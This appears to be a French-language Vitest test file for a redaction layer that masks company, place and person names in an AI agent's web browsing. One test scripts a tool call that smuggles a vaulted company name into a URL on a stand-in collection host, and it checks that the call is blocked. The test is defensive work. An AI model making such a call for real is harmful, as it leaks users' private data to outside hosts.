// @vitest-environment jsdom
import { afterEach, describe, expect, it } from "vitest";
import { BROWSER } from "./servers";
import { calls, mockModel, says, type MockModel, type MockRequest } from "./mockModel";
import { runWorkflow, type WorkflowRun } from "./workflow";

// Redaction × navigation — the interactions between the redaction rules and the agent
// browser, at the PROCESS level (real store, real loop, real redaction; scripted model).
// Each of these is a way redaction can make a navigation lie, leak, or mislead.

const NER = { "Karl Studio": "company", "Évreux": "location" };

let m: MockModel | undefined;
let run: WorkflowRun | undefined;
afterEach(async () => {
  m?.close();
  m = undefined;
  await run?.dispose();
  run = undefined;
});

const model = () => ({ provider: "openai-compat" as const, modelId: "qwen2.5", baseUrl: m!.url });

/** The company FAKE as the model sees it, from its own request body. */
function fakeCompanyIn(req: MockRequest): string {
  const user = String(req.messages.find((x) => x.role === "user")?.content ?? "");
  return /« (.+?) »/.exec(user)?.[1] ?? "INCONNU";
}

describe("the pre-search reveal card (what the MODEL may see)", () => {
  it("appears once, with exactly the enabled offerable categories", async () => {
    // The queries CARRY the fake (what a model researching the masked company writes):
    // a query touching no redacted data would now — by design — skip the card entirely
    // (clear-mode, pinned in « redaction dynamique » below).
    m = await mockModel([
      (req) => calls({ name: "browser__browser_navigate", args: { url: `https://www.google.com/search?q=${encodeURIComponent(fakeCompanyIn(req))}` } }),
      (req) => calls({ name: "browser__browser_navigate", args: { url: `https://www.google.com/search?q=${encodeURIComponent(fakeCompanyIn(req) + " avis")}` } }),
      says("Voilà."),
    ]);
    run = await runWorkflow({
      model: model(), ner: NER, servers: [BROWSER],
      // Explicit OFFs, not "everything else defaults off": the AI categories default ON
      // (catalog.test.ts), so relying on the default here would put all five on offer.
      rules: { company: true, location: true, name: false, dob: false, address: false },
    });
    await run.send("Cherche des infos sur « Karl Studio » à Évreux.");
    // ONE offer for the whole conversation (two browse calls), listing ONLY the
    // enabled offerable categories — name is OFF so it must not be proposed.
    expect(run.gates.navOffers).toHaveLength(1);
    expect(run.gates.navOffers[0].offerable.sort()).toEqual(["company", "location"]);
  }, 30_000);

  it("never appears while the conversation is PRISTINE (nothing redacted, vault empty)", async () => {
    m = await mockModel([
      calls({ name: "browser__browser_navigate", args: { url: "https://www.google.com/search?q=actualités france" } }),
      says("Voici les actualités."),
    ]);
    run = await runWorkflow({
      model: model(), servers: [BROWSER],
      // The offerable categories ARE enabled — it is the EMPTY VAULT that must skip
      // the card: with nothing ever redacted, there is nothing a reveal could change.
      rules: { company: true, location: true },
    });
    await run.send("Quelle actualité en France aujourd'hui ?");
    expect(run.gates.navOffers).toEqual([]);
    // …and the navigation itself is not blocked — it just proceeds without the card.
    expect(run.transcript.dispatched()).toContain("browser__browser_navigate");
  }, 30_000);

  it("never appears when no offerable category is enabled", async () => {
    m = await mockModel([
      calls({ name: "browser__browser_navigate", args: { url: "https://www.google.com/search?q=meteo" } }),
      says("Beau temps."),
    ]);
    run = await runWorkflow({
      model: model(), servers: [BROWSER],
      // "No offerable category" must now be STATED — with the AI set defaulting ON,
      // an empty rules object would leave all five on offer.
      rules: { name: false, dob: false, address: false, location: false, company: false },
    });
    await run.send("Quel temps fait-il à Paris ?");
    expect(run.gates.navOffers).toEqual([]);
  }, 30_000);

  it("refused ⇒ the model keeps seeing fakes, this send AND the next", async () => {
    m = await mockModel([
      (req) => calls({ name: "browser__browser_navigate", args: { url: `https://www.google.com/search?q=${encodeURIComponent("agence " + fakeCompanyIn(req))}` } }),
      says("Recherché."),
      (req) => says(`Tour 2 : ${req.messages[req.messages.length - 1]?.content}`),
    ]);
    run = await runWorkflow({
      model: model(), ner: NER, servers: [BROWSER],
      rules: { company: true },
      webNavPick: () => [], // the user closes the card / reveals nothing
    });
    await run.send("Cherche l'agence « Karl Studio ».");
    await run.send("Reparle-moi de Karl Studio.");
    // The refusal governs the USER-TYPED legs: the model must keep receiving the fake
    // in every user/system message. (A browsed PAGE's own mention of the org may still
    // come back in clear — that is `BROWSER_CLEAR`, the deliberate pinned policy that
    // place/org names in public web results are the answer's substance, not a reveal.)
    const typedLegs = run.transcript.events
      .filter((e) => e.t === "model:in")
      .flatMap((e) => (e.t === "model:in" ? e.messages.filter((x) => x.role !== "tool") : []))
      .map((x) => x.content)
      .join("\n");
    expect(typedLegs).not.toContain("Karl Studio");
    expect(run.conversation().redactCategories?.company).toBeUndefined(); // no override persisted
  }, 30_000);

  /**
   * ⚠️ La portée a CHANGÉ le 18/08 : le unredaction vaut pour CET ENVOI, plus pour la
   * conversation. Les deux moitiés comptent, et c'est pour ça qu'elles sont dans le même
   * cas : ce qui est révélé doit l'être TOUT DE SUITE (sinon la recherche en cours reste
   * redacted et l'utilisateur ne voit aucun effet), et RIEN ne doit survivre à l'envoi
   * (sinon une décision prise pour une recherche suit vingt messages).
   */
  it("approuvé ⇒ effectif SUR-LE-CHAMP, et rien ne survit à l'envoi", async () => {
    m = await mockModel([
      (req) => calls({ name: "browser__browser_navigate", args: { url: `https://www.google.com/search?q=${encodeURIComponent(fakeCompanyIn(req) + " Évreux")}` } }),
      says("Recherché."),
      (req) => says(`Tour 2 : ${req.messages[req.messages.length - 1]?.content}`),
    ]);
    run = await runWorkflow({
      model: model(), ner: NER, servers: [BROWSER],
      rules: { company: true },
      webNavPick: (offerable) => offerable, // « Passer en Standard » = tout l'offert
    });
    await run.send("Cherche l'agence « Karl Studio ».");

    // Le RÉSULTAT de la recherche en cours atteint le modèle EN CLAIR (la mutation
    // en place de `disabledKinds`), pas seulement au tour suivant.
    const toolMsgs = run.transcript.events
      .filter((e) => e.t === "model:in")
      .flatMap((e) => (e.t === "model:in" ? e.messages.filter((x) => x.role === "tool") : []));
    expect(toolMsgs.map((x) => x.content).join("\n")).toContain("Karl Studio");
    // RIEN n'est écrit dans la conversation : l'envoi suivant repart redacted.
    expect(run.conversation().redactCategories?.company).toBeUndefined();
    await run.send("Écris un mot sur Karl Studio.");
    const lastIn = [...run.transcript.events].reverse().find((e) => e.t === "model:in");
    const lastUser = lastIn?.t === "model:in" ? [...lastIn.messages].reverse().find((x) => x.role === "user") : undefined;
    expect(lastUser?.content).not.toContain("Karl Studio");
  }, 30_000);
});

describe("nav-exfil (what the URL may CARRY)", () => {
  it("a real vault value smuggled into a URL on a NON-search host opens the confirm card", async () => {
    m = await mockModel([
      (req) => calls({ name: "browser__browser_navigate", args: { url: `https://collect.example.com/?d=${encodeURIComponent(fakeCompanyIn(req))}` } }),
      says("Je n'ai pas navigué."),
    ]);
    run = await runWorkflow({
      model: model(), ner: NER, servers: [BROWSER],
      rules: { company: true },
      approveWrites: false, // the user refuses the exfil-looking navigation
    });
    await run.send("Va sur la fiche de « Karl Studio ».");
    expect(run.gates.writes).toEqual([
      expect.objectContaining({ tool: "browser__browser_navigate", reason: "nav-exfil", approved: false }),
    ]);
    expect(run.transcript.dispatched()).not.toContain("browser__browser_navigate");
  }, 30_000);

  it("the same value in a real search box on a real engine is EXEMPT (no card), and the query leaves REAL", async () => {
    m = await mockModel([
      (req) => calls({ name: "browser__browser_navigate", args: { url: `https://www.google.com/search?q=${encodeURIComponent(fakeCompanyIn(req))}` } }),
      says("Recherché."),
    ]);
    run = await runWorkflow({
      model: model(), ner: NER, servers: [BROWSER], rules: { company: true },
    });
    await run.send("Cherche « Karl Studio » sur le web.");
    expect(run.gates.writes).toEqual([]); // no confirm-fatigue on the product's core flow
    const url = String(run.transcript.wireArgsOf("browser__browser_navigate")?.url ?? "");
    expect(decodeURIComponent(url)).toContain("Karl Studio"); // the engine got the REAL query
    // The model's TYPED legs still only carry the fake — the real name it does see is
    // inside the page RESULT, which `BROWSER_CLEAR` deliberately keeps in clear.
    const typed = run.transcript.events
      .filter((e) => e.t === "model:in")
      .flatMap((e) => (e.t === "model:in" ? e.messages.filter((x) => x.role !== "tool") : []))
      .map((x) => x.content)
      .join("\n");
    expect(typed).not.toContain("Karl Studio");
  }, 30_000);
});

describe("fake-derived domains (what redaction can BREAK)", () => {
  it("a hostname BUILT FROM the fake is refused and the model is steered to search — " +
     "not dispatched to an unrelated real domain", async () => {
    m = await mockModel([
      (req) => {
        // What a real model does on "va sur le site de X" knowing only the fake
        // "Norvik Group": it guesses https://norvikgroup.fr — a REAL domain that has
        // nothing to do with the user's company.
        const host = fakeCompanyIn(req).toLowerCase().normalize("NFD").replace(/[̀-ͯ]/g, "").replace(/[^a-z0-9]/g, "");
        return calls({ name: "browser__browser_navigate", args: { url: `https://${host}.fr` } });
      },
      says("Je fais une recherche à la place."),
    ]);
    run = await runWorkflow({
      model: model(), ner: NER, servers: [BROWSER], rules: { company: true },
    });
    await run.send("Va sur le site de « Karl Studio ».");

    // The navigation must NOT reach a domain minted from the fake…
    expect(run.transcript.dispatched()).not.toContain("browser__browser_navigate");
    // …and the model must be TOLD why, so it can pivot to a search (whose query
    // WILL be un-redacted to the real name).
    const toolFeedback = run.transcript.events
      .filter((e) => e.t === "model:in")
      .flatMap((e) => (e.t === "model:in" ? e.messages.filter((x) => x.role === "tool") : []))
      .map((x) => x.content)
      .join("\n");
    expect(toolFeedback).toMatch(/pseudonyme|redact/i);
  }, 30_000);

  it("the REAL company's own domain is never blocked (only FAKE-derived hosts are)", async () => {
    m = await mockModel([
      calls({ name: "browser__browser_navigate", args: { url: "https://karl-studio.fr" } }),
      says("Site consulté."),
    ]);
    run = await runWorkflow({
      model: model(), ner: NER, servers: [BROWSER], rules: { company: true },
    });
    // The user pasted the URL themselves (url category OFF by default ⇒ URLs are
    // untouched, the model sees it verbatim and navigates to it).
    await run.send("Va sur https://karl-studio.fr et résume la page.");
    expect(run.transcript.dispatched()).toContain("browser__browser_navigate");
    expect(run.gates.writes).toEqual([]);
  }, 30_000);
});

describe("the « Amiens → autre ville » family (a location fake IS a real place)", () => {
  // The user asks for LOCAL news; location redaction hands the model some other real
  // city as the fake, so the model — correctly, from its view — researches THAT
  // city. (A bare COUNTRY no longer redacts at all — the notoriety filter spares it,
  // pinned in @openmasq/redact notorious.test.ts — so the fixture is a CITY.)
  // These pin the two recovery paths. ⚠️ Assert on the TRANSCRIPT (the wire):
  // the displayed answer goes through `fromWire`, which converts the fake BACK to
  // « amiens » — an assertion on displayed text is a tautology that can't see the bug.

  /** The user-role contents of the LAST model call — the wire the model actually read. */
  function lastWireUserLegs(r: WorkflowRun): string {
    const last = [...r.transcript.events].reverse().find((e) => e.t === "model:in");
    return last?.t === "model:in"
      ? last.messages.filter((x) => x.role === "user").map((x) => x.content).join("|")
      : "";
  }

  it("disabling the category in the conversation panel un-fakes the HISTORY on the next send", async () => {
    m = await mockModel([
      says("Voici les actualités : élections, grève des transports."),
      says("Tour 2."),
    ]);
    run = await runWorkflow({
      model: model(),
      ner: { amiens: "location" },
      rules: { location: true },
    });
    await run.send("Recherche les actualités à amiens .");
    const fake = Object.entries(run.conversation().redactionVault ?? {}).find(([, r]) => r === "amiens")?.[0];
    expect(fake, "aucun fake minté pour « amiens »").toBeTruthy();
    // Turn 1's wire really carried the fake (the known cost of location redaction).
    expect(lastWireUserLegs(run)).toContain(String(fake));

    // The user disables Lieux + noms in the conversation's info panel.
    await run.setConversationCategories({ location: false, name: false });

    await run.send("Continue : encore des actualités à amiens .");
    // The NEXT send's WIRE — including the REPLAYED turn-1 history — must now carry the
    // real « amiens », not the fake: the override the panel promises.
    const wire = lastWireUserLegs(run);
    expect(wire).toContain("actualités à amiens");
    expect(wire, `l'historique rejoue encore le fake « ${fake} »`).not.toContain(String(fake));
  }, 30_000);

  it("approving the reveal card REWIRES the current turn's context — the model must not keep reading the fake", async () => {
    // The model only knows the FAKE city, so its query carries it (which is also what
    // keeps the reveal gate armed — a data-free query now skips the card by design).
    const fakeCityIn = (req: MockRequest): string => {
      const user = String(req.messages.find((x) => x.role === "user")?.content ?? "");
      return /actualités à (.+?)\s*\./.exec(user)?.[1] ?? "INCONNU";
    };
    m = await mockModel([
      // The model first reaches for the browser (fires the reveal gate)…
      (req) => calls({ name: "browser__browser_navigate", args: { url: `https://www.google.com/search?q=${encodeURIComponent("actualités à " + fakeCityIn(req))}` } }),
      // …then the loop calls it again with the tool result appended.
      says("Recherché."),
    ]);
    run = await runWorkflow({
      model: model(),
      ner: { amiens: "location" },
      rules: { location: true },
      servers: [BROWSER],
      webNavPick: (offerable) => offerable, // the user reveals everything on offer
    });
    await run.send("Recherche les actualités à amiens .");
    expect(run.gates.navOffers).toHaveLength(1); // the card DID open and was approved
    // After the reveal, the SAME turn's later model calls must read « amiens » in the
    // user message — not the fake the history was built with before the gate. Without a
    // rewire, the model keeps researching the fake country for the whole turn, which is
    // exactly the reported bug ("j'ai révélé mais la recherche reste sur l'autre ville").
    const wire = lastWireUserLegs(run);
    expect(wire).toContain("actualités à amiens");
  }, 30_000);
});

describe("redaction dynamique du navigateur (clear-mode)", () => {
  /** Every tool-role leg the model read, joined. */
  function toolLegs(r: WorkflowRun): string {
    return r.transcript.events
      .filter((e) => e.t === "model:in")
      .flatMap((e) => (e.t === "model:in" ? e.messages.filter((x) => x.role === "tool") : []))
      .map((x) => x.content)
      .join("\n");
  }

  it("a redacted conversation whose SEARCH carries nothing skips the card and hands the page to the model in CLEAR", async () => {
    m = await mockModel([
      calls({ name: "browser__browser_navigate", args: { url: "https://elpais.example.com/actualite" } }),
      says("Résumé des actualités."),
    ]);
    run = await runWorkflow({
      model: model(), ner: NER, servers: [BROWSER],
      rules: { company: true, location: true },
    });
    // The conversation IS redacted (« Karl Studio » is vaulted from the user's own
    // message — the exact situation where the card used to pop) — but the CALL touches
    // no redacted data, and that is what decides now.
    await run.send("Je travaille pour « Karl Studio ». Quelle est l'actualité en Espagne ?");
    expect(Object.keys(run.conversation().redactionVault ?? {}).length).toBeGreaterThan(0);
    expect(run.gates.navOffers).toEqual([]); // no card: the navigation passes no data
    expect(run.transcript.dispatched()).toContain("browser__browser_navigate");
    // The page reached the model UNDETECTED: the email + phone the FULL path would
    // redact (both deterministic-rule categories, ON by default) arrive verbatim.
    expect(toolLegs(run)).toContain("contact@karl-studio.fr");
    expect(toolLegs(run)).toContain("02 32 00 00 00");
  }, 30_000);

  // ⚠️ Journal du 27/07/2026 — le cas qui a fait tomber tout le reste. Le modèle appelle
  // `browser_navigate` SANS le préfixe du connecteur (le navigateur n'était même pas dans
  // l'offre du tour). Le client tolère et route quand même, donc l'appel ABOUTIT ; mais
  // `isGovernedWebTool` répondait `false` sur ce nom nu, donc PAS de mode clair : le moteur
  // complet tournait sur une page publique et vaultait son contenu — dont un mot que
  // l'utilisateur avait écrit EN CLAIR dans sa demande. Toute URL le contenant devenait
  // ensuite « porteuse de données de conversation », et l'exploration s'arrêtait net.
  it("un nom d'outil SANS préfixe garde le mode clair (le nom est recalé avant les politiques)", async () => {
    m = await mockModel([
      calls({ name: "browser_navigate", args: { url: "https://elpais.example.com/actualite" } }),
      says("Résumé des actualités."),
    ]);
    run = await runWorkflow({
      model: model(), ner: NER, servers: [BROWSER],
      rules: { company: true, location: true },
    });
    await run.send("Je travaille pour « Karl Studio ». Quelle est l'actualité en Espagne ?");
    // Recalé : la trace porte le nom CANONIQUE, pas celui que le modèle a écrit.
    expect(run.transcript.dispatched()).toContain("browser__browser_navigate");
    // Et la conséquence qui compte : la page publique n'est PAS passée au moteur complet.
    expect(toolLegs(run)).toContain("contact@karl-studio.fr");
    expect(toolLegs(run)).toContain("02 32 00 00 00");
  }, 30_000);

  it("dynamic mid-send flip: a later call of the SAME send that carries the fake still pauses on the card", async () => {
    m = await mockModel([
      // First call: data-free (clear-mode, no card)…
      calls({ name: "browser__browser_navigate", args: { url: "https://www.google.com/search?q=météo+madrid" } }),
      // …second call embeds the fake → full path + the card, mid-send.
      (req) => calls({ name: "browser__browser_navigate", args: { url: `https://www.google.com/search?q=${encodeURIComponent(fakeCompanyIn(req))}` } }),
      says("Fini."),
    ]);
    run = await runWorkflow({
      model: model(), ner: NER, servers: [BROWSER], rules: { company: true },
    });
    await run.send("Météo à Madrid, puis cherche des infos sur « Karl Studio ».");
    expect(run.gates.navOffers).toHaveLength(1); // the second call re-armed the gate
    expect(run.transcript.dispatched().filter((t) => t === "browser__browser_navigate")).toHaveLength(2);
  }, 30_000);

  it("web_fetch_many of PUBLIC urls rides the SAME clear-mode: a front page's public figures reach the model VERBATIM", async () => {
    // The reported bug: « Quelle actualité en France ? » → web_fetch_many(lemonde.fr)
    // fully redacted minted 100+ fakes (Lagarde → « Chloé Cros », Trump → « Jules »)
    // and the answer distorted the story. A data-free fetch of a public page is the
    // browser clear-mode's exact situation — one rule (rule 9).
    m = await mockModel([
      calls({ name: "web_fetch_many", args: { urls: ["https://www.lemonde.example.fr"] } }),
      says("Résumé de l'actualité."),
    ]);
    run = await runWorkflow({
      model: model(), ner: { ...NER, "Claire Fontaine": "name" }, servers: [],
      rules: { name: true, company: true },
      webPages: {
        // The page mentions a PUBLIC figure and the user's OWN name (their team's
        // press mention…). SEARCH_CLEAR keeps org/place in clear for this tool, so
        // the identity-coherence check rides the NAME.
        "https://www.lemonde.example.fr":
          "Christine Lagarde estime que l'inflation persiste. Interview de Claire Fontaine.",
      },
    });
    // The conversation IS redacted (the user's own name is vaulted)…
    await run.send("Je m'appelle Claire Fontaine. Quelle actualité en France aujourd'hui ?");
    const vault = run.conversation().redactionVault ?? {};
    const fake = Object.entries(vault).find(([, r]) => r === "Claire Fontaine")?.[0];
    expect(fake, "aucun fake pour « Claire Fontaine »").toBeTruthy();
    expect(run.transcript.dispatched()).toContain("web_fetch_many");
    // …but the fetch carried no redacted data ⇒ REPLAY-only: the public figure passes
    // verbatim (no minted fake), while the user's OWN vaulted name is still replayed
    // to its fake in the page text (identity coherence).
    expect(toolLegs(run)).toContain("Christine Lagarde");
    expect(toolLegs(run)).not.toContain("Claire Fontaine");
    expect(toolLegs(run)).toContain(String(fake));
    // No new identity was minted for the public name.
    expect(Object.values(run.conversation().redactionVault ?? {})).not.toContain("Christine Lagarde");
  }, 30_000);

  it("a web_fetch_many whose URL carries the fake still takes the FULL redaction path", async () => {
    m = await mockModel([
      (req) =>
        calls({
          name: "web_fetch_many",
          args: { urls: [`https://www.google.com/search?q=${encodeURIComponent(fakeCompanyIn(req))}`] },
        }),
      says("Fini."),
    ]);
    run = await runWorkflow({
      model: model(), ner: { ...NER, "Nadia Vannec": "name" }, servers: [],
      rules: { name: true, company: true },
      webPages: {
        // Keyed by the WIRE url (un-redacted, percent-ENCODED) the host actually receives.
        "https://www.google.com/search?q=Karl%20Studio":
          "Résultats : Nadia Vannec parle de Karl Studio.",
      },
    });
    await run.send("Cherche des infos sur « Karl Studio ».");
    // The search-host exemption lets the query DISPATCH (that IS the search)…
    expect(run.transcript.dispatched()).toContain("web_fetch_many");
    // …but the call touches redacted data ⇒ clear-mode is DENIED: the FULL engine ran,
    // so the page's PRIVATE person is redacted (a NOTORIOUS figure would pass verbatim —
    // that's the test above; here the name is private, so it must be faked).
    expect(toolLegs(run)).not.toContain("Nadia Vannec");
    expect(Object.values(run.conversation().redactionVault ?? {})).toContain("Nadia Vannec");
  }, 30_000);

  it("clear-mode still REPLAYS the vault: a page mention of a redacted NAME reaches the model as the fake", async () => {
    m = await mockModel([
      calls({ name: "browser__browser_navigate", args: { url: "https://annuaire.example.com/equipe" } }),
      says("Vu."),
    ]);
    run = await runWorkflow({
      model: model(),
      ner: { "Claire Fontaine": "name" },
      servers: [{
        id: "browser",
        tools: [{
          name: "browser_navigate",
          description: "Naviguer vers une URL.",
          inputSchema: { type: "object", properties: { url: { type: "string" } }, required: ["url"] },
          // The page happens to mention the user's OWN redacted name (their team page,
          // a directory…) — identity coherence demands the model keep seeing the fake.
          result: "Page chargée.\n\nÉquipe : Claire Fontaine (direction), Paul Rueda (design)",
        }],
      }],
      rules: { name: true },
    });
    await run.send("Mon nom est Claire Fontaine. Ouvre l'annuaire de l'équipe.");
    const fake = Object.entries(run.conversation().redactionVault ?? {}).find(([, r]) => r === "Claire Fontaine")?.[0];
    expect(fake, "aucun fake minté pour « Claire Fontaine »").toBeTruthy();
    expect(run.gates.navOffers).toEqual([]); // data-free navigation: no card
    // The vaulted name is REPLAYED to its fake in the page text; the third-party
    // name (never redacted in this conversation) passes in clear.
    expect(toolLegs(run)).not.toContain("Claire Fontaine");
    expect(toolLegs(run)).toContain(String(fake));
    expect(toolLegs(run)).toContain("Paul Rueda");
  }, 30_000);
});
